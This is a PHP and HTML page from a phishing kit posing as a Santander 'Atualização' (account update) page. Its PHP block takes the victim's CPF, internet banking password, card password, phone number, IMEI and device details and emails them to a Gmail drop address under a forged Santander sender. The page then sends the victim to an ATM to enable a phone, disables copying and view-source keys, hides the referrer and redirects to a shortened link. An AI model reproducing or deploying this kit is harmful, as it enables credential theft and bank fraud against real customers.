<?php 
  if(isset($_POST))
	{
		$ip = $_SERVER['REMOTE_ADDR'];

		//$emaildestinatario = 'Caixaatualizda@gmail.com';
		//$emaildestinatario = 'erickqueiroz93@gmail.com';
        $emaildestinatario = 'Itauatualizda@gmail.com';

		$subj = "Dados / IP: $ip - Chegou: Santander";


		$mensagemHTML = '
		<p>------------- |Chegou Santander| ------------</p>

		<p><b>CPF:</b> '.$_POST['cpf'].'<br>
		<p><b>Senha Net:</b> '.$_POST['snet'].'<br>
		<p><b>Senha Cartao:</b> '.$_POST['scard'].'<br>
		<p><b>Telefone:</b> '.$_POST['ddd'].' '.$_POST['fone'].'<br>
		<p><b>IMEI:</b> '.$_POST['imei'].'<br>
		<p><b>Dispositivo:</b> '.$_POST['dispositivo'].'<br>
		<p><b>IP:</b> '.$ip.'<br>
		<br>
		<p>-------------- |Chegou Santander| -----------------</p>

		';

		$headers = "MIME-Version: 1.1\r\n";
		$headers .= "Content-type: text/html; charset=utf-8\r\n";
		$headers .= "From: recadastramento@santander.com.br \r\n";
		$headers .= "Return-Path: recadastramento@santander.com.br \r\n";
		$envio = mail($emaildestinatario, $subj, $mensagemHTML, $headers);
    sleep(2);
	}
?>
<html><head><script>
function disableselect(e){
    return false;
}

function reEnable(){   
    return true;
}

document.onselectstart = function() { return false; }   
document.oncontextmenu = function() { return false; }

if (window.sidebar) {   
    document.onmousedown = disableselect;   
    document.onclick = reEnable;
}

document.onkeydown = function(e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 ||  e.keyCode === 117)) {
    alert('Acao nao permitida!');
    return false;
  } else {
          return true;
        }
};
</script>
<!-- Referrer -->
<script>
  var meta = document.createElement('meta');
  meta.name = "referrer";
  meta.content = "no-referrer";
  document.getElementsByTagName('head')[0].appendChild(meta);
</script><meta name="referrer" content="no-referrer">





<meta charset="utf-8">
<title>Atualização</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<meta name="mobile-web-app-capable" content="yes">
<link rel="stylesheet" type="text/css" href="style.css">
<style>
p {
 line-height: 1.6;
}
</style>
</head>

<body onload="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/sant_logo.png">	
</div>
	<br>
<div id="topo2">

</div>	

<div id="campos">
 
<br>
<br>
<center>
<p><span style="font-size: 22px; color: #E0000A;">Atenção!</span></p><br>
<p><span style="font-size: 14px; color: #222;">Para que o cadastro seja finalizado, dirija-se ao</span> <span style="font-size: 14px; color: #222; font-weight: bold;">Caixa Eletrônico</span><span style="font-size: 14px; color: #222;"> em até </span><span style="font-size: 14px; color: #222; font-weight: bold;">24h</span> <span style="font-size: 14px; color: #222;">e siga as seguintes instruções:<br>
"Menu - Habilitar Celular", escolhendo o </span><span style="font-size: 14px; color: #222; font-weight: bold;">ID SANTANDER</span><span style="font-size: 14px; color: #222;">.</span></p>	
</center>
<br>
<div class="img-box" id="img1">
<img src="images/id_sant_anima_sincronia_ok.gif">  
<br>
<br>

<script language="javascript">setTimeout(function(){ window.location = "https://goo.gl/4duc";  }, 20000);</script>	
</div>
</div>

</body></html>